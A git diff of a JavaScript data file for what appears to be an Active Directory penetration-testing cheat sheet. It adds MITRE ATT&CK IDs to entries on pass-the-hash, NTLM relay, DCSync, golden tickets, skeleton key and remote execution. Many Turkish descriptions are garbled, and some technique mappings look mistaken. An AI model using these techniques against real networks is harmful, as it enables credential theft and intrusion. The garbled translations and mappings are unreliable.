-            "desc_tr": "Extract AS-REP hashes for users without pre-auth"
+            "desc_tr": "Extract AS-REP hashes for users without pre-auth",
+            "attack": [
+              "T1558.004"
+            ]
           },
           {
             "title": "AS-REP Roasting (Rubeus)",
@@ -13203,7 +15423,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Extract AS-REP hashes using Rubeus on Windows",
-            "desc_tr": "Extract AS-REP hashes using Rubeus on Windows"
+            "desc_tr": "Extract AS-REP hashes using Rubeus on Windows",
+            "attack": [
+              "T1558.004",
+              "T1110.002"
+            ]
           },
           {
             "title": "Crack AS-REP Hashes",
@@ -13212,7 +15436,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Crack AS-REP hashes with hashcat",
-            "desc_tr": "Crack AS-REP hashes with hashcat"
+            "desc_tr": "Crack AS-REP hashes with hashcat",
+            "attack": [
+              "T1558.004",
+              "T1110.002"
+            ]
           },
           {
             "title": "Overpass the Hash (Rubeus)",
@@ -13221,7 +15449,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Request TGT using NTLM hash and inject into current session",
-            "desc_tr": "Request TGT using NTLM hash and inject into current session"
+            "desc_tr": "Request TGT using NTLM hash and inject into current session",
+            "attack": [
+              "T1550.002",
+              "T1550.003"
+            ]
           },
           {
             "title": "Overpass the Hash (Impacket)",
@@ -13230,7 +15462,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Request TGT using NTLM hash and save to ccache file",
-            "desc_tr": "Request TGT using NTLM hash and save to ccache file"
+            "desc_tr": "Request TGT using NTLM hash and save to ccache file",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "Pass the Ticket (.kirbi)",
@@ -13239,7 +15474,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Inject a Kerberos ticket into the current session",
-            "desc_tr": "Enjekte et: a Kerberos ticket inthe mevcut session'e"
+            "desc_tr": "Enjekte et: a Kerberos ticket inthe mevcut session'e",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "Pass the Ticket (.ccache)",
@@ -13263,7 +15501,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Poison LLMNR, NBT-NS, and MDNS to capture Net-NTLMv2 hashes",
-            "desc_tr": "PoisLLMNR, NBT-NS, and MDNS capture Net-NTLMv2 hashes üzerinde'e"
+            "desc_tr": "PoisLLMNR, NBT-NS, and MDNS capture Net-NTLMv2 hashes üzerinde'e",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "Responder (Analyze Mode)",
@@ -13272,7 +15513,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Run Responder in analyze mode to see traffic without poisoning",
-            "desc_tr": "Run Responder in analyze mode to see traffic without poisoning"
+            "desc_tr": "Run Responder in analyze mode to see traffic without poisoning",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay to SMB",
@@ -13281,7 +15525,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Relay captured NTLM authentication to SMB targets for SAM dump",
-            "desc_tr": "Relay captured NTLM authentication to SMB targets for SAM dump"
+            "desc_tr": "Relay captured NTLM authentication to SMB targets for SAM dump",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay to LDAP",
@@ -13290,7 +15537,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Relay NTLM auth to LDAP and configure RBCD",
-            "desc_tr": "Relay NTLM auth to LDAP and configure RBCD"
+            "desc_tr": "Relay NTLM auth to LDAP and configure RBCD",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay to LDAP (Shadow Creds)",
@@ -13299,7 +15549,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Relay to LDAP and add shadow credentials for PKINIT auth",
-            "desc_tr": "Relay to LDAP and add shadow credentials for PKINIT auth"
+            "desc_tr": "Relay to LDAP and add shadow credentials for PKINIT auth",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay Execute Command",
@@ -13308,7 +15561,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Relay NTLM auth and execute a command on the target",
-            "desc_tr": "Relay NTLM auth and execute a command on the target"
+            "desc_tr": "Relay NTLM auth and execute a command on the target",
+            "attack": [
+              "T1557.001",
+              "T1033"
+            ]
           },
           {
             "title": "PetitPotam Coercion",
@@ -13317,7 +15574,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Coerce DC authentication via MS-EFSRPC (EFS)",
-            "desc_tr": "Coerce DC kimlik doğrulama MS-EFSRPC (EFS) üzerinden"
+            "desc_tr": "Coerce DC kimlik doğrulama MS-EFSRPC (EFS) üzerinden",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "PetitPotam (Authenticated)",
@@ -13326,7 +15586,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Coerce DC authentication with credentials",
-            "desc_tr": "Coerce DC kimlik doğrulama kimlik bilgileri ile"
+            "desc_tr": "Coerce DC kimlik doğrulama kimlik bilgileri ile",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "PrinterBug / SpoolSample",
@@ -13353,7 +15616,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Perform IPv6 DNS takeover for NTLM relay via WPAD",
-            "desc_tr": "Perform IPv6 DNS takeover for NTLM relay WPAD üzerinden"
+            "desc_tr": "Perform IPv6 DNS takeover for NTLM relay WPAD üzerinden",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "mitm6 + ntlmrelayx Combo",
@@ -13367,7 +15633,10 @@ module.exports = [
             ],
             "desc": "Combine mitm6 with ntlmrelayx for LDAP relay attack",
             "note": "Run mitm6 and ntlmrelayx in separate terminals",
-            "desc_tr": "Combine mitm6 ntlmrelayx for LDAP relay attack ile"
+            "desc_tr": "Combine mitm6 ntlmrelayx for LDAP relay attack ile",
+            "attack": [
+              "T1557.001"
+            ]
           }
         ],
         "name_tr": "NTLM Relay & Coercion"
@@ -13382,7 +15651,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Crack captured Net-NTLMv2 hashes with hashcat",
-            "desc_tr": "Crack captured Net-NTLMv2 hashes with hashcat"
+            "desc_tr": "Crack captured Net-NTLMv2 hashes with hashcat",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Crack NTLMv1 Hash",
@@ -13391,7 +15663,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Crack captured NTLMv1 hashes with hashcat",
-            "desc_tr": "Crack captured NTLMv1 hashes with hashcat"
+            "desc_tr": "Crack captured NTLMv1 hashes with hashcat",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "NTLM Relay Interactive Shell",
@@ -13400,7 +15675,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Get an interactive SMB shell through NTLM relay",
-            "desc_tr": "Get an interactive SMB shell through NTLM relay"
+            "desc_tr": "Get an interactive SMB shell through NTLM relay",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay Dump Secrets",
@@ -13409,7 +15687,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Relay and dump LAPS, ADCS, and gMSA data",
-            "desc_tr": "Relay and dump LAPS, ADCS, and gMSA data"
+            "desc_tr": "Relay and dump LAPS, ADCS, and gMSA data",
+            "attack": [
+              "T1557.001",
+              "T1190"
+            ]
           },
           {
             "title": "Generate Targets List (No SMB Signing)",
@@ -13433,7 +15715,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Pass the Hash via PsExec for SYSTEM shell",
-            "desc_tr": "Pass the Hash PsExec for SYSTEM shell üzerinden"
+            "desc_tr": "Pass the Hash PsExec for SYSTEM shell üzerinden",
+            "attack": [
+              "T1021.002",
+              "T1550.002"
+            ]
           },
           {
             "title": "PtH with Impacket WMIExec",
@@ -13442,7 +15728,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Pass the Hash via WMI for semi-interactive shell",
-            "desc_tr": "Pass the Hash WMI for semi-interactive shell üzerinden"
+            "desc_tr": "Pass the Hash WMI for semi-interactive shell üzerinden",
+            "attack": [
+              "T1047",
+              "T1550.002"
+            ]
           },
           {
             "title": "PtH with Impacket SMBExec",
@@ -13451,7 +15741,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Pass the Hash via SMB service for SYSTEM shell",
-            "desc_tr": "Pass the Hash SMB service for SYSTEM shell üzerinden"
+            "desc_tr": "Pass the Hash SMB service for SYSTEM shell üzerinden",
+            "attack": [
+              "T1021.002",
+              "T1550.002"
+            ]
           },
           {
             "title": "PtH with Impacket AtExec",
@@ -13460,7 +15754,12 @@ module.exports = [
               "tool"
             ],
             "desc": "Pass the Hash via scheduled task execution",
-            "desc_tr": "Pass the Hash zamanlanmış görevler executiüzerinden üzerinde"
+            "desc_tr": "Pass the Hash zamanlanmış görevler executiüzerinden üzerinde",
+            "attack": [
+              "T1033",
+              "T1550.002",
+              "T1053.005"
+            ]
           },
           {
             "title": "PtH with CrackMapExec",
@@ -13469,7 +15768,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Pass the Hash and execute commands with CME",
-            "desc_tr": "Pass the Hash and execute commands CME ile"
+            "desc_tr": "Pass the Hash and execute commands CME ile",
+            "attack": [
+              "T1033",
+              "T1550.002"
+            ]
           },
           {
             "title": "PtH with Evil-WinRM",
@@ -13478,7 +15781,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Pass the Hash via WinRM for PowerShell access",
-            "desc_tr": "Pass the Hash WinRM for PowerShell access üzerinden"
+            "desc_tr": "Pass the Hash WinRM for PowerShell access üzerinden",
+            "attack": [
+              "T1059.001",
+              "T1021.006",
+              "T1550.002"
+            ]
           },
           {
             "title": "Mimikatz Pass the Hash",
@@ -13487,7 +15795,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Inject NTLM hash into a new process with mimikatz",
-            "desc_tr": "Enjekte et: NTLM hash ina new process mimikatz ile'e"
+            "desc_tr": "Enjekte et: NTLM hash ina new process mimikatz ile'e",
+            "attack": [
+              "T1003.001",
+              "T1059.003",
+              "T1550.002"
+            ]
           },
           {
             "title": "Import ccache Ticket",
@@ -13496,7 +15809,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Use a cached Kerberos ticket for authentication",
-            "desc_tr": "Use a cached Kerberos ticket for kimlik doğrulama"
+            "desc_tr": "Use a cached Kerberos ticket for kimlik doğrulama",
+            "attack": [
+              "T1021.002"
+            ]
           }
         ],
         "name_tr": "Pass the Hash / Ticket"
@@ -13520,7 +15836,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Abuse constrained delegation via S4U2Self and S4U2Proxy",
-            "desc_tr": "Kötüye kullan: kısıtlı delegasyS4U2Self and S4U2Proxy üzerinden üzerinde"
+            "desc_tr": "Kötüye kullan: kısıtlı delegasyS4U2Self and S4U2Proxy üzerinden üzerinde",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "Constrained Delegation — S4U (Impacket)",
@@ -13529,7 +15848,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Perform S4U attack with impacket for service ticket",
-            "desc_tr": "Perform S4U attack impacket for service ticket ile"
+            "desc_tr": "Perform S4U attack impacket for service ticket ile",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "RBCD Attack — Set msDS-AllowedToActOnBehalfOfOtherIdentity",
@@ -13554,7 +15876,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Configure RBCD via AD module and abuse with Rubeus",
-            "desc_tr": "Configure RBCD via AD module and abuse with Rubeus"
+            "desc_tr": "Configure RBCD via AD module and abuse with Rubeus",
+            "attack": [
+              "T1059.001",
+              "T1550.003"
+            ]
           }
         ],
         "name_tr": "Delegation Exploitation"
@@ -13569,7 +15895,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Replicate credentials from DC using directory replication rights",
-            "desc_tr": "Replicate kimlik bilgileri DC directory replicatirights kullanarak üzerinden üzerinde"
+            "desc_tr": "Replicate kimlik bilgileri DC directory replicatirights kullanarak üzerinden üzerinde",
+            "attack": [
+              "T1003.001",
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "DCSync with Impacket",
@@ -13578,7 +15909,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Dump all domain hashes via DCSync with impacket",
-            "desc_tr": "Dump all domain hashes via DCSync with impacket"
+            "desc_tr": "Dump all domain hashes via DCSync with impacket",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "DCSync Specific User",
@@ -13587,7 +15922,11 @@ module.exports = [
               "essential"
             ],
             "desc": "DCSync only the krbtgt account hash",
-            "desc_tr": "Yalnızca krbtgt hesabının hash'ini DCSync ile al"
+            "desc_tr": "Yalnızca krbtgt hesabının hash'ini DCSync ile al",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "DCSync with Hashes",
@@ -13596,7 +15935,12 @@ module.exports = [
               "tool"
             ],
             "desc": "DCSync using Pass the Hash for NTLM hashes only",
-            "desc_tr": "DCSync Pass the Hash for NTLM hashes only kullanarak"
+            "desc_tr": "DCSync Pass the Hash for NTLM hashes only kullanarak",
+            "attack": [
+              "T1003.003",
+              "T1003.006",
+              "T1550.002"
+            ]
           },
           {
             "title": "Golden Ticket (Mimikatz)",
@@ -13605,7 +15949,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Forge a Golden Ticket and inject into current session",
-            "desc_tr": "Sahte oluştur: a Golden Ticket and inject incurrent session'e"
+            "desc_tr": "Sahte oluştur: a Golden Ticket and inject incurrent session'e",
+            "attack": [
+              "T1003.001",
+              "T1558.001",
+              "T1550.003"
+            ]
           },
           {
             "title": "Golden Ticket (Impacket)",
@@ -13614,7 +15963,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Forge a Golden Ticket ccache file",
-            "desc_tr": "Sahte oluştur: a Golden Ticket ccache file"
+            "desc_tr": "Sahte oluştur: a Golden Ticket ccache file",
+            "attack": [
+              "T1558.001"
+            ]
           },
           {
             "title": "Silver Ticket (Mimikatz)",
@@ -13623,7 +15975,13 @@ module.exports = [
               "advanced"
             ],
             "desc": "Forge a Silver Ticket for a specific service",
-            "desc_tr": "Sahte oluştur: a Silver Ticket for a belirli service"
+            "desc_tr": "Sahte oluştur: a Silver Ticket for a belirli service",
+            "attack": [
+              "T1003.001",
+              "T1558.001",
+              "T1558.002",
+              "T1550.003"
+            ]
           },
           {
             "title": "Diamond Ticket (Rubeus)",
@@ -13632,7 +15990,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Forge a Diamond Ticket by modifying a legitimate TGT",
-            "desc_tr": "Sahte oluştur: a Diamond Ticket by modifying a legitimate TGT"
+            "desc_tr": "Sahte oluştur: a Diamond Ticket by modifying a legitimate TGT",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "Skeleton Key",
@@ -13642,7 +16003,11 @@ module.exports = [
             ],
             "desc": "Inject skeleton key into LSASS on DC — master password 'mimikatz'",
             "note": "Allows login as any user with password 'mimikatz' - lost on reboot",
-            "desc_tr": "Enjekte et: skeletkey inLSASS on DC — master password 'mimikatz' üzerinde'e"
+            "desc_tr": "Enjekte et: skeletkey inLSASS on DC — master password 'mimikatz' üzerinde'e",
+            "attack": [
+              "T1003.001",
+              "T1556"
+            ]
           },
           {
             "title": "DCShadow Push Attribute",
@@ -13655,7 +16020,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Push arbitrary AD changes by impersonating a domain controller",
-            "desc_tr": "Push arbitrary AD changes by impersonating a etki alanı denetleyicisi (DC)"
+            "desc_tr": "Push arbitrary AD changes by impersonating a etki alanı denetleyicisi (DC)",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "AdminSDHolder Persistence",
@@ -13692,7 +16060,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Extract DPAPI backup keys from the domain controller",
-            "desc_tr": "Extract DPAPI backup keys from the domain controller"
+            "desc_tr": "Extract DPAPI backup keys from the domain controller",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Group Policy Abuse (SharpGPOAbuse)",
@@ -13710,7 +16081,12 @@ module.exports = [
               "advanced"
             ],
             "desc": "Add scheduled task via writable GPO for code execution",
-            "desc_tr": "Add scheduled task via writable GPO for code execution"
+            "desc_tr": "Add scheduled task via writable GPO for code execution",
+            "attack": [
+              "T1087",
+              "T1059.003",
+              "T1053.005"
+            ]
           },
           {
             "title": "Shadow Credentials (Whisker)",
@@ -13850,7 +16226,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Add a user to Domain Admins if you have write access",
-            "desc_tr": "Add a user to Domain Admins if you have write access"
+            "desc_tr": "Add a user to Domain Admins if you have write access",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "ForceChangePassword (PowerView)",
@@ -13869,7 +16248,10 @@ module.exports = [
               "advanced"
             ],
             "note": "DANGEROUS: Can break AD",
-            "desc_tr": "Reset DC password to empty"
+            "desc_tr": "Reset DC password to empty",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "PrintNightmare",
@@ -13878,7 +16260,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "RCE Print Spooler üzerinden"
+            "desc_tr": "RCE Print Spooler üzerinden",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "noPac",
@@ -13920,7 +16305,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Relay to ADCS"
+            "desc_tr": "Relay to ADCS",
+            "attack": [
+              "T1557.001"
+            ]
           }
         ],
         "name_tr": "ADCS Exploitation"
@@ -13945,7 +16333,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Remote shell via SMB service creation — returns SYSTEM",
-            "desc_tr": "Uzaktan shell SMB service creati— returns SYSTEM üzerinden üzerinde"
+            "desc_tr": "Uzaktan shell SMB service creati— returns SYSTEM üzerinden üzerinde",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "Impacket PsExec (Hash)",
@@ -13954,7 +16345,11 @@ module.exports = [
               "essential"
             ],
             "desc": "PsExec with Pass the Hash authentication",
-            "desc_tr": "PsExec Pass the Hash kimlik doğrulama ile"
+            "desc_tr": "PsExec Pass the Hash kimlik doğrulama ile",
+            "attack": [
+              "T1021.002",
+              "T1550.002"
+            ]
           },
           {
             "title": "Impacket WMIExec",
@@ -13963,7 +16358,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Semi-interactive shell via WMI — runs as user, less noisy",
-            "desc_tr": "Semi-interactive shell WMI — runs as user, less noisy üzerinden"
+            "desc_tr": "Semi-interactive shell WMI — runs as user, less noisy üzerinden",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Impacket SMBExec",
@@ -13972,7 +16370,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Shell via SMB — similar to PsExec but different implementation",
-            "desc_tr": "Shell SMB — similar PsExec but different implementatiüzerinden üzerinde'e"
+            "desc_tr": "Shell SMB — similar PsExec but different implementatiüzerinden üzerinde'e",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "Impacket AtExec",
@@ -13981,7 +16382,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Execute command via Task Scheduler service",
-            "desc_tr": "Execute command via Task Scheduler service"
+            "desc_tr": "Execute command via Task Scheduler service",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Impacket DCOMExec",
@@ -14008,7 +16412,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "PsExec using Kerberos ticket authentication",
-            "desc_tr": "PsExec Kerberos ticket kimlik doğrulama kullanarak"
+            "desc_tr": "PsExec Kerberos ticket kimlik doğrulama kullanarak",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "DCOMExec",
@@ -14020,7 +16427,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute via DCOM"
+            "desc_tr": "Execute via DCOM",
+            "attack": [
+              "T1550.002"
+            ]
           }
         ],
         "name_tr": "Impacket Execution"
@@ -14035,7 +16445,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Interactive PowerShell shell via WinRM with password",
-            "desc_tr": "Interactive PowerShell shell WinRM password üzerinden ile"
+            "desc_tr": "Interactive PowerShell shell WinRM password üzerinden ile",
+            "attack": [
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM (Hash)",
@@ -14044,7 +16458,11 @@ module.exports = [
               "essential"
             ],
             "desc": "WinRM shell with Pass the Hash",
-            "desc_tr": "WinRM shell Pass the Hash ile"
+            "desc_tr": "WinRM shell Pass the Hash ile",
+            "attack": [
+              "T1021.006",
+              "T1550.002"
+            ]
           },
           {
             "title": "Evil-WinRM (Key-Based)",
@@ -14053,7 +16471,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "WinRM shell with certificate-based authentication",
-            "desc_tr": "WinRM shell certificate-based kimlik doğrulama ile"
+            "desc_tr": "WinRM shell certificate-based kimlik doğrulama ile",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Upload File",
@@ -14062,7 +16483,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Upload a file to target via Evil-WinRM session",
-            "desc_tr": "Upload a file to target via Evil-WinRM session"
+            "desc_tr": "Upload a file to target via Evil-WinRM session",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Download File",
@@ -14071,7 +16495,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Download a file from target via Evil-WinRM session",
-            "desc_tr": "Download a file from target via Evil-WinRM session"
+            "desc_tr": "Download a file from target via Evil-WinRM session",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Enter-PSSession (PowerShell)",
@@ -14080,7 +16507,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Interactive PowerShell remoting session",
-            "desc_tr": "Etkileşimli PowerShell uzak oturumu"
+            "desc_tr": "Etkileşimli PowerShell uzak oturumu",
+            "attack": [
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "Invoke-Command (Single Host)",
@@ -14089,7 +16520,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Execute commands on a remote host via PS remoting",
-            "desc_tr": "Execute commands on a remote host via PS remoting"
+            "desc_tr": "Execute commands on a remote host via PS remoting",
+            "attack": [
+              "T1033",
+              "T1021.006"
+            ]
           },
           {
             "title": "Invoke-Command (Multiple Hosts)",
@@ -14098,7 +16533,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Execute commands on multiple remote hosts simultaneously",
-            "desc_tr": "Execute commands on multiple remote hosts simultaneously"
+            "desc_tr": "Execute commands on multiple remote hosts simultaneously",
+            "attack": [
+              "T1033",
+              "T1021.006"
+            ]
           },
           {
             "title": "New-PSSession Persistent",
@@ -14110,7 +16549,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Create and enter a persistent PowerShell remoting session",
-            "desc_tr": "Create and enter a persistent PowerShell remoting session"
+            "desc_tr": "Create and enter a persistent PowerShell remoting session",
+            "attack": [
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "WinRS Remote Command",
@@ -14119,7 +16562,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Execute command remotely via Windows Remote Shell",
-            "desc_tr": "Execute command remotely via Windows Remote Shell"
+            "desc_tr": "Execute command remotely via Windows Remote Shell",
+            "attack": [
+              "T1033",
+              "T1021.006"
+            ]
           },
           {
             "title": "Invoke-Command Multi",
@@ -14128,7 +16575,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute on multiple targets"
+            "desc_tr": "Execute on multiple targets",
+            "attack": [
+              "T1033",
+              "T1021.006"
+            ]
           },
           {
             "title": "New-PSSession + Copy",
@@ -14141,7 +16592,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Create session and copy files"
+            "desc_tr": "Create session and copy files",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "runas /netonly",
@@ -14150,7 +16604,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run with different domain creds"
+            "desc_tr": "Run with different domain creds",
+            "attack": [
+              "T1059.003"
+            ]
           }
         ],
         "name_tr": "WinRM & PowerShell Remoting"
@@ -14165,7 +16622,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Remote execution using Sysinternals PsExec binary",
-            "desc_tr": "Uzaktan executiSysinternals PsExec binary kullanarak üzerinde"
+            "desc_tr": "Uzaktan executiSysinternals PsExec binary kullanarak üzerinde",
+            "attack": [
+              "T1059.003",
+              "T1021.002"
+            ]
           },
           {
             "title": "PsExec.exe as SYSTEM",
@@ -14174,7 +16635,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Run remote command as SYSTEM with PsExec",
-            "desc_tr": "Run remote command as SYSTEM with PsExec"
+            "desc_tr": "Run remote command as SYSTEM with PsExec",
+            "attack": [
+              "T1059.003",
+              "T1021.002"
+            ]
           },
           {
             "title": "Remote Service Creation (sc.exe)",
@@ -14187,7 +16652,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Create and start a remote service for command execution",
-            "desc_tr": "Create and start a remote service for command execution"
+            "desc_tr": "Create and start a remote service for command execution",
+            "attack": [
+              "T1059.003",
+              "T1543.003"
+            ]
           },
           {
             "title": "Remote Scheduled Task",
@@ -14200,7 +16669,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Create, run, and clean up a remote scheduled task",
-            "desc_tr": "Create, run, and clean up a uzak zamanlanmış görevler"
+            "desc_tr": "Create, run, and clean up a uzak zamanlanmış görevler",
+            "attack": [
+              "T1059.003",
+              "T1053.005"
+            ]
           },
           {
             "title": "WMIC Remote Process Create",
@@ -14209,7 +16682,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Execute a remote process via WMI command line",
-            "desc_tr": "Execute a remote process via WMI command line"
+            "desc_tr": "Execute a remote process via WMI command line",
+            "attack": [
+              "T1059.003",
+              "T1047"
+            ]
           },
           {
             "title": "CrackMapExec Command Exec",
@@ -14218,7 +16695,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Execute command via SMB with CrackMapExec",
-            "desc_tr": "Execute command via SMB with CrackMapExec"
+            "desc_tr": "Execute command via SMB with CrackMapExec",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "CrackMapExec PowerShell Exec",
@@ -14227,7 +16707,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Execute PowerShell command via SMB with CME",
-            "desc_tr": "Execute PowerShell command via SMB with CME"
+            "desc_tr": "Execute PowerShell command via SMB with CME",
+            "attack": [
+              "T1057",
+              "T1059.001"
+            ]
           },
           {
             "title": "CrackMapExec Dump SAM",
@@ -14254,7 +16738,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Dump all domain hashes from NTDS.dit via CME",
-            "desc_tr": "Dump all domain hashes from NTDS.dit via CME"
+            "desc_tr": "Dump all domain hashes from NTDS.dit via CME",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "Runas with Network Credentials",
@@ -14264,7 +16752,10 @@ module.exports = [
             ],
             "desc": "Spawn cmd.exe with alternate network credentials",
             "note": "Only affects network authentication, not local",
-            "desc_tr": "Spawn cmd.exe with alternate network credentials"
+            "desc_tr": "Spawn cmd.exe with alternate network credentials",
+            "attack": [
+              "T1059.003"
+            ]
           },
           {
             "title": "SharpRDP Remote Desktop Exec",
@@ -14273,7 +16764,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Execute commands via RDP protocol without full GUI session",
-            "desc_tr": "Execute commands via RDP protocol without full GUI session"
+            "desc_tr": "Execute commands via RDP protocol without full GUI session",
+            "attack": [
+              "T1059.003"
+            ]
           }
         ],
         "name_tr": "Windows Remote Services"
@@ -14288,7 +16782,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Connect via RDP with xfreerdp",
-            "desc_tr": "Connect via RDP with xfreerdp"
+            "desc_tr": "Connect via RDP with xfreerdp",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "xfreerdp (Hash — Restricted Admin)",
@@ -14297,7 +16794,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "RDP Pass the Hash via Restricted Admin mode",
-            "desc_tr": "RDP Pass the Hash Restricted Admmode üzerinden içinde"
+            "desc_tr": "RDP Pass the Hash Restricted Admmode üzerinden içinde",
+            "attack": [
+              "T1021.001",
+              "T1550.002"
+            ]
           },
           {
             "title": "xfreerdp with Drive Sharing",
@@ -14306,7 +16807,10 @@ module.exports = [
               "tool"
             ],
             "desc": "RDP connection with a shared local directory",
-            "desc_tr": "RDP connectia shared yerel directory ile üzerinde"
+            "desc_tr": "RDP connectia shared yerel directory ile üzerinde",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "rdesktop",
@@ -14315,7 +16819,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Connect via RDP with rdesktop",
-            "desc_tr": "Connect via RDP with rdesktop"
+            "desc_tr": "Connect via RDP with rdesktop",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "Enable RDP Remotely",
@@ -14333,7 +16840,10 @@ module.exports = [
               "essential"
             ],
             "desc": "RDP ignoring certificate warnings",
-            "desc_tr": "Sertifika uyarılarını yok sayarak RDP"
+            "desc_tr": "Sertifika uyarılarını yok sayarak RDP",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "RDP Pass-the-Hash Check",
@@ -14342,7 +16852,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Test if RDP PtH via Restricted Admin is possible",
-            "desc_tr": "Test et: if RDP PtH Restricted Admis possible üzerinden içinde"
+            "desc_tr": "Test et: if RDP PtH Restricted Admis possible üzerinden içinde",
+            "attack": [
+              "T1550.002"
+            ]
           }
         ],
